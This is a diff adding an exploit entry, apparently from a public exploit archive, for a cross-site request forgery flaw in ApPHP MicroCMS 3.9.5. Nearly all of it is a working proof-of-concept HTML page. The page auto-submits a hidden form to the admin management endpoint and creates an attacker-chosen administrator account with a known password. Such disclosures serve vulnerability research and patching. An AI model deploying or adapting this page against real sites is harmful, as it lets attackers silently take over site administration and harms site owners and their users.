@@ -1,0 +1,53 @@
+# Exploit Title :----------------- : ApPHP MicroCMS 3.9.5 - Cross-Site Request Forgery (Add Admin (Main))
+# Author :------------------------ : Besim
+# Google Dork :---------------- :  -
+# Date :-------------------------- : 12/10/2016
+# Type :-------------------------- : webapps
+# Platform : -------------------- :  PHP  
+# Vendor Homepage :------- : http://www.apphp.com
+# Software link : -------------- : https://www.apphp.com/customer/index.php?page=free-products
+
+*-* Vulnerable link : http://site_name/path/index.php?admin=admins_management
+
+
+############  CSRF PoC  #############
+
+<html>
+  <!-- CSRF PoC -->
+  <body>
+    <form action="http://site_name/path/index.php?admin=admins_management" method="POST" enctype="multipart/form-data">
+      <input type="hidden" name="mg&#95;prefix" value="&#13;" />
+      <input type="hidden" name="mg&#95;action" value="create" />
+      <input type="hidden" name="mg&#95;rid" value="&#45;1" />
+      <input type="hidden" name="mg&#95;sorting&#95;fields" value="&#13;" />
+      <input type="hidden" name="mg&#95;sorting&#95;types" value="&#13;" />
+      <input type="hidden" name="mg&#95;page" value="1" />
+      <input type="hidden" name="mg&#95;operation" value="&#13;" />
+      <input type="hidden" name="mg&#95;operation&#95;type" value="&#13;" />
+      <input type="hidden" name="mg&#95;operation&#95;field" value="&#13;" />
+      <input type="hidden" name="mg&#95;search&#95;status" value="&#13;" />
+      <input type="hidden" name="mg&#95;language&#95;id" value="&#13;" />
+      <input type="hidden" name="mg&#95;operation&#95;code" value="yh0ox75feagwqbccp8ef" />
+      <input type="hidden" name="token" value="dbe0e51cf3a5ce407336a94f52043157" />
+      <input type="hidden" name="date&#95;lastlogin" value="&#13;" />
+      <input type="hidden" name="date&#95;created" value="2016&#45;10&#45;12&#32;21&#58;14&#58;06" />
+      <input type="hidden" name="first&#95;name" value="meryem" />
+      <input type="hidden" name="last&#95;name" value="ak" />
+      <input type="hidden" name="email" value="mmm&#64;yopmail&#46;com" />
+      <input type="hidden" name="user&#95;name" value="meryem" />
+      <input type="hidden" name="password" value="meryem" />
+      <input type="hidden" name="account&#95;type" value="admin" />
+      <input type="hidden" name="preferred&#95;language" value="en" />
+      <input type="hidden" name="is&#95;active" value="1" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+
+############  ########## ############
+
+
+*-* Thanks Meryem AKDOĞAN *-*
